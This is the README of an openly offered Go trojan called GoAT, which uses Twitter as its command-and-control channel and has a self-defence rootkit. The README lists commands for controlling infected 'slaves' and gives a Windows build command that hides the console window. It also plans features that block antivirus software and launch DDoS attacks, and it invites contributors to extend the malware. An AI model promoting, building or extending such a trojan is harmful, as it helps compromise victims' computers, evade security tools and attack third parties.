GoAT
---
[![forthebadge](http://forthebadge.com/images/badges/built-with-love.svg)](http://forthebadge.com) [![forthebadge](http://forthebadge.com/images/badges/made-with-crayons.svg)](http://forthebadge.com)

**Golang Advanced Trojan** is a trojan created in Go, using Twitter as a the C&C server. GoAT has some very unique and impressive capabilities, including multithreaded command execution and a sophisticated self defence rootkit module (written in C). If you're not familiar with malware, please do not run this program on yourself. It's very hard to remove once it is insalled.

---
### Commands
```!echo <message>``` - Logs message to slave console

```!quit``` - Closes GoAT

```!clear``` - Does nothing. Use this command if you don't want slaves to execute anything upon connecting.


### Compilation
Compile with  ```go build -o GoAT.exe -ldflags "-H windowsgui" "C:\GoAT.go"```	to have no console show.


### Under development
While I keep teaching myself Go, I will be updating this project. If at anytime someone would like to add to the project they can. Just post in the 'issues' section and I will add your code and credits to the main project.

### To do list
* Check for >1 running instance
* Rootkit: Prevent use and installation of antimalware/antivirus software
* Commands
  * DDoS
  * Send messagebox
  * Uninstall
  * Shutdown/Restart

---

### Other stuff
GoAT was inspired by SaturnsVoid's GoBot, which can be found here: https://github.com/SaturnsVoid/GoBot

Go is a amazing and powerful programming language. If you already haven't, check it out; https://golang.org/
